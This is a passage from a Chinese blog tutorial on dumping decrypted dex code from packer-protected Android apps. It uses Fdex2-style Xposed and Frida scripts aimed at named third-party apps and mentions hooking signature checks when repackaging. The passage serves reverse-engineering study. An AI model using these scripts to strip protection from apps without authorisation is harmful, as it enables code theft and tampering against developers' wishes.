src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/3.png\" alt=\"image-20211213161658498\"></p>\n<p>然后通过该类对象去调用getBytes()，来获取数据信息</p>\n<h2 id=\"三、Fdex2实现\"><a href=\"#三、Fdex2实现\" class=\"headerlink\" title=\"三、Fdex2实现\"></a>三、Fdex2实现</h2><h3 id=\"1-配置Xposed环境\"><a href=\"#1-配置Xposed环境\" class=\"headerlink\" title=\"1.配置Xposed环境\"></a>1.配置Xposed环境</h3><h3 id=\"2-编写Fdex2源码\"><a href=\"#2-编写Fdex2源码\" class=\"headerlink\" title=\"2.编写Fdex2源码\"></a>2.编写Fdex2源码</h3><h4 id=\"（1）获取getBytes-和getDex-的方法引用\"><a href=\"#（1）获取getBytes-和getDex-的方法引用\" class=\"headerlink\" title=\"（1）获取getBytes()和getDex()的方法引用\"></a>（1）获取getBytes()和getDex()的方法引用</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class Dex;</span><br><span class=\"line\">Method Dex_getBytes;</span><br><span class=\"line\">Method getDex;</span><br><span class=\"line\">String packagename;</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"> <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">initRefect</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// public byte[] getBytes()</span></span><br><span class=\"line\">            Dex = Class.forName(<span class=\"string\">&quot;com.android.dex.Dex&quot;</span>);</span><br><span class=\"line\">            Dex_getBytes = Dex.getDeclaredMethod(<span class=\"string\">&quot;getBytes&quot;</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">            <span class=\"comment\">// public Dex getDex()</span></span><br><span class=\"line\">            getDex = Class.forName(<span class=\"string\">&quot;java.lang.Class&quot;</span>).getDeclaredMethod(<span class=\"string\">&quot;getDex&quot;</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）编写hook代码\"><a href=\"#（2）编写hook代码\" class=\"headerlink\" title=\"（2）编写hook代码\"></a>（2）编写hook代码</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handleLoadPackage</span><span class=\"params\">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">      initRefect();</span><br><span class=\"line\">      XposedBridge.log(<span class=\"string\">&quot;目标包名：&quot;</span>+ lpparam.packageName);</span><br><span class=\"line\">      <span class=\"type\">String</span> <span class=\"variable\">str</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;java.lang.ClassLoader&quot;</span>;</span><br><span class=\"line\">      <span class=\"type\">String</span> <span class=\"variable\">str2</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;loadClass&quot;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">packagename</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com.jiongji.andriod.card&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">//   protected Class&lt;?&gt; loadClass(String className, boolean resolve) throws ClassNotFoundException</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span>(lpparam.packageName.equals(packagename))&#123;</span><br><span class=\"line\">          <span class=\"comment\">// public static Unhook findAndHookMethod(String var0, ClassLoader var1, String var2, Object... var3)</span></span><br><span class=\"line\">          XposedHelpers.findAndHookMethod(str, lpparam.classLoader, str2, String.class, Boolean.TYPE, <span class=\"keyword\">new</span> <span class=\"title class_\">XC_MethodHook</span>() &#123;</span><br><span class=\"line\">              <span class=\"meta\">@Override</span></span><br><span class=\"line\">              <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">afterHookedMethod</span><span class=\"params\">(MethodHookParam param)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">                  <span class=\"built_in\">super</span>.afterHookedMethod(param);</span><br><span class=\"line\">                  <span class=\"comment\">//获取hook函数返回类</span></span><br><span class=\"line\">                  <span class=\"type\">Class</span> <span class=\"variable\">cls</span> <span class=\"operator\">=</span> (Class) param.getResult();</span><br><span class=\"line\">                  <span class=\"keyword\">if</span>(cls == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                  &#125;</span><br><span class=\"line\">                  <span class=\"type\">String</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> cls.getName();</span><br><span class=\"line\">                  XposedBridge.log(<span class=\"string\">&quot;当前类名：&quot;</span>+name);</span><br><span class=\"line\">                  <span class=\"type\">byte</span>[] bArr = (<span class=\"type\">byte</span>[]) Dex_getBytes.invoke(getDex.invoke(cls,<span class=\"literal\">null</span>)); <span class=\"comment\">//Class.getDex().getBytes()</span></span><br><span class=\"line\">                  <span class=\"keyword\">if</span>(bArr == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                      XposedBridge.log(<span class=\"string\">&quot;数据为空，返回&quot;</span>);</span><br><span class=\"line\">                      <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                  &#125;</span><br><span class=\"line\">                  XposedBridge.log(<span class=\"string\">&quot;开始写数据&quot;</span>);</span><br><span class=\"line\">                  <span class=\"type\">String</span> <span class=\"variable\">dex_path</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;/data/data/&quot;</span>+packagename+<span class=\"string\">&quot;/&quot;</span>+packagename+<span class=\"string\">&quot;_&quot;</span>+bArr.length+<span class=\"string\">&quot;.dex&quot;</span>;</span><br><span class=\"line\">                  XposedBridge.log(dex_path);</span><br><span class=\"line\">                  <span class=\"type\">File</span> <span class=\"variable\">file</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(dex_path);</span><br><span class=\"line\">                  <span class=\"keyword\">if</span>(file.exists())&#123;</span><br><span class=\"line\">                      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                  &#125;</span><br><span class=\"line\">                  writeByte(bArr,file.getAbsolutePath());</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"meta\">@Override</span></span><br><span class=\"line\">              <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">beforeHookedMethod</span><span class=\"params\">(MethodHookParam param)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">                  <span class=\"built_in\">super</span>.beforeHookedMethod(param);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">          &#125;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>图示如下：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/4.png\" alt=\"image-20211213162622686\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/5.png\" alt=\"image-20211213162929639\"></p>\n<h4 id=\"（3）保存数据\"><a href=\"#（3）保存数据\" class=\"headerlink\" title=\"（3）保存数据\"></a>（3）保存数据</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">writeByte</span><span class=\"params\">(<span class=\"type\">byte</span>[] bArr,String str)</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">          <span class=\"type\">OutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(str);</span><br><span class=\"line\">          outputStream.write(bArr);</span><br><span class=\"line\">          outputStream.close();</span><br><span class=\"line\">      &#125;  <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">          e.printStackTrace();</span><br><span class=\"line\">          XposedBridge.log(<span class=\"string\">&quot;文件写出失败&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-运行及结果演示\"><a href=\"#3-运行及结果演示\" class=\"headerlink\" title=\"3.运行及结果演示\"></a>3.运行及结果演示</h3><p>（1）编译安装xposed模块，然后重启</p>\n<p>（2）打开目标应用，运行</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/6.png\" alt=\"image-20211213163101141\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/7.png\" alt=\"image-20211213163128728\"></p>\n<h2 id=\"四、Frida版本修改-针对android7-0\"><a href=\"#四、Frida版本修改-针对android7-0\" class=\"headerlink\" title=\"四、Frida版本修改(针对android7.0)\"></a>四、Frida版本修改(针对android7.0)</h2><h3 id=\"1-frida实现getDex-和getBytes\"><a href=\"#1-frida实现getDex-和getBytes\" class=\"headerlink\" title=\"1.frida实现getDex()和getBytes()\"></a>1.frida实现getDex()和getBytes()</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">fdex2</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// java.lang.Class.getDex</span></span><br><span class=\"line\">        <span class=\"comment\">// com.android.dex.Dex.getBytes</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// var Class = Java.use(&quot;java.lang.Class&quot;);</span></span><br><span class=\"line\">        <span class=\"comment\">// console.log(Class);</span></span><br><span class=\"line\">        <span class=\"comment\">// var getDex = Class.getDex.overloads;</span></span><br><span class=\"line\">        <span class=\"comment\">// if(getDex !=null)&#123;</span></span><br><span class=\"line\">        <span class=\"comment\">//     console.log(getDex);</span></span><br><span class=\"line\">        <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">        <span class=\"comment\">// var Dex = Java.use(&quot;com.android.dex.Dex&quot;);</span></span><br><span class=\"line\">        <span class=\"comment\">// var getBytes = Dex.getBytes.overloads;</span></span><br><span class=\"line\">        <span class=\"comment\">// if(getBytes != null)&#123;</span></span><br><span class=\"line\">        <span class=\"comment\">//     console.log(getBytes);</span></span><br><span class=\"line\">        <span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title class_\">Java</span>.<span class=\"title function_\">enumerateClassLoadersSync</span>().<span class=\"title function_\">forEach</span>(<span class=\"keyword\">function</span> (<span class=\"params\">loader</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> <span class=\"title class_\">Class</span> = loader.<span class=\"title function_\">loadClass</span>(<span class=\"string\">&quot;java.lang.Class&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">var</span> methods= <span class=\"title class_\">Class</span>.<span class=\"title function_\">getDeclaredMethods</span>();</span><br><span class=\"line\">                methods.<span class=\"title function_\">forEach</span>(<span class=\"keyword\">function</span> (<span class=\"params\">method</span>) &#123;</span><br><span class=\"line\">                    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(method);</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (e)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> <span class=\"title class_\">Dex</span> = loader.<span class=\"title function_\">loadClass</span>(<span class=\"string\">&quot;com.android.dex.Dex&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">var</span> methods= <span class=\"title class_\">Dex</span>.<span class=\"title function_\">getDeclaredMethods</span>();</span><br><span class=\"line\">                methods.<span class=\"title function_\">forEach</span>(<span class=\"keyword\">function</span> (<span class=\"params\">method</span>) &#123;</span><br><span class=\"line\">                    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(method);</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (e)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_\">fdex2</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/8.png\" alt=\"image-20211214095439271\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/9.png\" alt=\"image-20211214100026323\"></p>\n<h3 id=\"2-fdex2-frida版本的实现\"><a href=\"#2-fdex2-frida版本的实现\" class=\"headerlink\" title=\"2.fdex2 frida版本的实现\"></a>2.fdex2 frida版本的实现</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// public static void savedex(byte[] content,String filepath) throws IOException &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     FileOutputStream fileOutputStream = new FileOutputStream(new File(filepath));</span></span><br><span class=\"line\"><span class=\"comment\">//     fileOutputStream.write(content);</span></span><br><span class=\"line\"><span class=\"comment\">//     fileOutputStream.close();</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">savedex</span>(<span class=\"params\">dexbytes,dexpath</span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"title class_\">File</span> = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;java.io.File&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"title class_\">FileOutputStream</span> = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;java.io.FileOutputStream&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> fileobj = <span class=\"title class_\">File</span>.$new(dexpath);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> fileOutputStreamobj = <span class=\"title class_\">FileOutputStream</span>.$new(fileobj);</span><br><span class=\"line\">        fileOutputStreamobj.<span class=\"title function_\">write</span>(dexbytes);</span><br><span class=\"line\">        fileOutputStreamobj.<span class=\"title function_\">close</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">warn</span>(<span class=\"string\">&quot;[dumpdex]&quot;</span>+dexpath);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">fdex2</span>(<span class=\"params\">classname</span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"title class_\">Java</span>.<span class=\"title function_\">enumerateClassLoadersSync</span>().<span class=\"title function_\">forEach</span>(<span class=\"keyword\">function</span> (<span class=\"params\">loader</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> <span class=\"title class_\">ThisClass</span> = loader.<span class=\"title function_\">loadClass</span>(classname);</span><br><span class=\"line\">                <span class=\"comment\">//var Class = Java.use(&quot;java.lang.Class&quot;);</span></span><br><span class=\"line\">                <span class=\"keyword\">var</span> dexobj = <span class=\"title class_\">ThisClass</span>.<span class=\"title function_\">getDex</span>();</span><br><span class=\"line\">                <span class=\"keyword\">var</span> dexbytearray = dexobj.<span class=\"title function_\">getBytes</span>();</span><br><span class=\"line\">                <span class=\"keyword\">var</span> savedexpath = <span class=\"string\">&quot;/sdcard/&quot;</span>+classname + <span class=\"string\">&quot;.dex&quot;</span>;</span><br><span class=\"line\">                <span class=\"title function_\">savedex</span>(dexbytearray,savedexpath);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (e)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用方法：</p>\n<p>（1）附加脚本</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">frida -<span class=\"variable constant_\">FU</span> -l <span class=\"title class_\">Fdex2</span>.<span class=\"property\">js</span> --no-pause <span class=\"comment\">//attach方式启动APP 不需要setImmediate()</span></span><br></pre></td></tr></table></figure>\n\n<p>（2）脱取指定的Activity</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/10.png\" alt=\"image-20211214105157751\"></p>\n<h3 id=\"3-fdex2脱壳时机点\"><a href=\"#3-fdex2脱壳时机点\" class=\"headerlink\" title=\"3.fdex2脱壳时机点\"></a>3.fdex2脱壳时机点</h3><h4 id=\"（1）onCreate函数执行完\"><a href=\"#（1）onCreate函数执行完\" class=\"headerlink\" title=\"（1）onCreate函数执行完\"></a>（1）onCreate函数执行完</h4><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//时机点</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"title class_\">StubApp</span> = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;com.stub.StubApp&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//时机点1</span></span><br><span class=\"line\">        <span class=\"title class_\">StubApp</span>.<span class=\"property\">onCreate</span>.<span class=\"property\">implementation</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> result = <span class=\"variable language_\">this</span>.<span class=\"title function_\">onCreate</span>();</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;StubAPP.onCreate called over!&quot;</span>);</span><br><span class=\"line\">            <span class=\"title function_\">fdex2</span>(<span class=\"string\">&quot;com.touchtv.module_live.view.activity.PreviewListActivity&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> <span class=\"title function_\">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>\n\n<p>执行命令：</p>\n<p>可以直接对包名进行进行附加：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">frida -U -f com.<span class=\"property\">touchtv</span>.<span class=\"property\">touchtv</span> -l <span class=\"title class_\">Fdex2</span>.<span class=\"property\">js</span> --no-pause  <span class=\"comment\">//spwan模式在APP启动之前就开始附加 需要setImmediate()</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/11.png\" alt=\"image-20211214111226523\"></p>\n<h4 id=\"（2）attchBaseContext方法\"><a href=\"#（2）attchBaseContext方法\" class=\"headerlink\" title=\"（2）attchBaseContext方法\"></a>（2）attchBaseContext方法</h4><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//时机点</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"title class_\">StubApp</span> = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;com.stub.StubApp&quot;</span>);</span><br><span class=\"line\">   \t\t<span class=\"comment\">//时机点2</span></span><br><span class=\"line\">        <span class=\"title class_\">StubApp</span>.<span class=\"property\">attachBaseContext</span>.<span class=\"property\">implementation</span> = <span class=\"keyword\">function</span> (<span class=\"params\">arg0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> result = <span class=\"variable language_\">this</span>.<span class=\"title function_\">attachBaseContext</span>(arg0);</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;StubAPP.attachBaseContext called over!&quot;</span>);</span><br><span class=\"line\">            <span class=\"title function_\">fdex2</span>(<span class=\"string\">&quot;com.touchtv.module_live.view.activity.PreviewListActivity&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> <span class=\"title function_\">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>\n\n<p>执行命令同上</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/12.png\" alt=\"image-20211214111752868\"></p>\n<p>我们验证时机点在attchBaseContext()之前，发现无法hook，说明dex文件在attachBaseContext()之后才解密</p>\n<h3 id=\"4-fdex2的扩展使用\"><a href=\"#4-fdex2的扩展使用\" class=\"headerlink\" title=\"4.fdex2的扩展使用\"></a>4.fdex2的扩展使用</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>使用frida枚举所有Classloader </span><br><span class=\"line\"><span class=\"number\">2.</span>确定正确的ClassLoader并获取目标类的Class对象</span><br><span class=\"line\"><span class=\"number\">3.</span>通过Class对象获取得到dex对象</span><br><span class=\"line\"><span class=\"number\">4.</span>通过dex对象获取内存字节流并保存</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、高版本的类似fdex2脱壳的实现（android-8-0以上）\"><a href=\"#五、高版本的类似fdex2脱壳的实现（android-8-0以上）\" class=\"headerlink\" title=\"五、高版本的类似fdex2脱壳的实现（android 8.0以上）\"></a>五、高版本的类似fdex2脱壳的实现（android 8.0以上）</h2><h3 id=\"1-高版本脱壳实现原理图\"><a href=\"#1-高版本脱壳实现原理图\" class=\"headerlink\" title=\"1.高版本脱壳实现原理图\"></a>1.高版本脱壳实现原理图</h3><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/13.png\" alt=\"image-20211214131558973\"></p>\n<p>获取最终的mCookie</p>\n<h4 id=\"（1）mCookie脱壳原理解析\"><a href=\"#（1）mCookie脱壳原理解析\" class=\"headerlink\" title=\"（1）mCookie脱壳原理解析\"></a>（1）mCookie脱壳原理解析</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">核心思路：反射 + mCookie（其实脱壳的点太多了，这是其中一个）</span><br><span class=\"line\">步骤：</span><br><span class=\"line\"><span class=\"number\">1</span>、找到加固apk的任一class，一般选择主Application或Activity</span><br><span class=\"line\"><span class=\"number\">2</span>、通过该类找到对应的Classloader</span><br><span class=\"line\"><span class=\"number\">3</span>、通过该Classloader找到BaseDexClassLoader</span><br><span class=\"line\"><span class=\"number\">4</span>、通过BaseDexClassLoader找到其字段DexPathList</span><br><span class=\"line\"><span class=\"number\">5</span>、通过DexPathList找到其变量Element数组dexElements</span><br><span class=\"line\"><span class=\"number\">6</span>、迭代该数组，该数组内部包含DexFile结构</span><br><span class=\"line\"><span class=\"number\">7</span>、通过DexFile获取其变量mCookie和mFileName（这个名字没什么鸟用）</span><br><span class=\"line\"> </span><br><span class=\"line\">至此我们已经获取了mCookie</span><br><span class=\"line\"> </span><br><span class=\"line\">对该mCookie的解释（有些现在记不太清楚了）：</span><br><span class=\"line\">#<span class=\"number\">1</span>、<span class=\"number\">4.4</span>以下好像，mCookie对应的是一个<span class=\"type\">int</span>值，该值是指向<span class=\"keyword\">native</span>层内存中的dexfile的指针</span><br><span class=\"line\">#<span class=\"number\">2</span>、<span class=\"number\">5.0</span>是一个<span class=\"type\">long</span>值，该值指向<span class=\"keyword\">native</span>层std::vector&lt;const DexFile*&gt;* 指针，注意这里有多个dex，你需要找到你要的</span><br><span class=\"line\">#<span class=\"number\">3</span>、我还测试了<span class=\"number\">8.0</span>手机，该值也是一个<span class=\"type\">long</span>型的值，指向底层vector，但是vector下标<span class=\"number\">0</span>是oat文件，从<span class=\"number\">1</span>开始是dex文件</span><br><span class=\"line\"><span class=\"comment\">// 至于你手机是那个版本，如果没有落入我上面描述的，你需要自己看看代码</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"number\">8</span>、根据mCookie对应的值做转换，最终你能找到dexfile内存指针</span><br><span class=\"line\"><span class=\"number\">9</span>、把该指针转换为dexfile结构，通过findClassDef来匹配你所寻找的dex是你要的dex</span><br><span class=\"line\"><span class=\"number\">10</span>、dump写文件</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">代码说明（代码包括java层和<span class=\"keyword\">native</span>层，但java层只需定义一个<span class=\"keyword\">native</span>函数即可）：</span><br><span class=\"line\"><span class=\"number\">1</span>、代码核心部分为dump_dex.h 和 dump_dex.cpp，里面涉及你需要自行实现的部分（我测试用的<span class=\"number\">5.0</span><span class=\"number\">.2</span> moto手机，</span><br><span class=\"line\">如果你的手机版本或者手机型号不同，你可能需要修改我表明的地方）</span><br><span class=\"line\"><span class=\"number\">2</span>、代码相对简单，你可以自行阅读</span><br><span class=\"line\"> </span><br><span class=\"line\">坑：</span><br><span class=\"line\">此方法思路相对简单，但是操作相对繁琐</span><br><span class=\"line\"><span class=\"number\">1</span>、你需要重打包apk</span><br><span class=\"line\"><span class=\"number\">2</span>、如果遇到签名校验，你同时需要在重打包中加入hook签名代码</span><br></pre></td></tr></table></figure>\n\n<p>详细参考博客：<a href=\"https://bbs.pediy.com/thread-252284.htm\">Android万能脱壳机</a></p>\n<h3 id=\"2-获取mCookie\"><a href=\"#2-获取mCookie\" class=\"headerlink\" title=\"2.获取mCookie\"></a>2.获取mCookie</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">dumpDexBymCookie</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">       <span class=\"title class_\">Java</span>.<span class=\"title function_\">choose</span>(<span class=\"string\">&quot;dalvik.system.DexFile&quot;</span>,&#123;</span><br><span class=\"line\">           <span class=\"attr\">onMatch</span>:<span class=\"keyword\">function</span> (<span class=\"params\">dexfile</span>) &#123;</span><br><span class=\"line\">               <span class=\"keyword\">var</span> mCookie = dexfile.<span class=\"property\">mCookie</span>.<span class=\"property\">value</span>;</span><br><span class=\"line\">               <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(mCookie.<span class=\"property\">$className</span>);</span><br><span class=\"line\">               <span class=\"keyword\">var</span> <span class=\"title class_\">Array</span> = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;java.lang.reflect.Array&quot;</span>);</span><br><span class=\"line\">               <span class=\"keyword\">var</span> size = <span class=\"title class_\">Array</span>.<span class=\"title function_\">getLength</span>(mCookie);</span><br><span class=\"line\">               <span class=\"keyword\">var</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">               <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;size;i++)&#123;</span><br><span class=\"line\">                   <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(i+<span class=\"string\">&quot;-&gt;&quot;</span>+<span class=\"title class_\">Array</span>.<span class=\"title function_\">getLong</span>(mCookie,i));</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">           &#125;,<span class=\"attr\">onComplete</span>:<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">               <span class=\"variable language_\">console</span>.<span class=\"title function_\">warn</span>(<span class=\"string\">&quot;Search DexFile over!&quot;</span>);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;) </span><br><span class=\"line\">  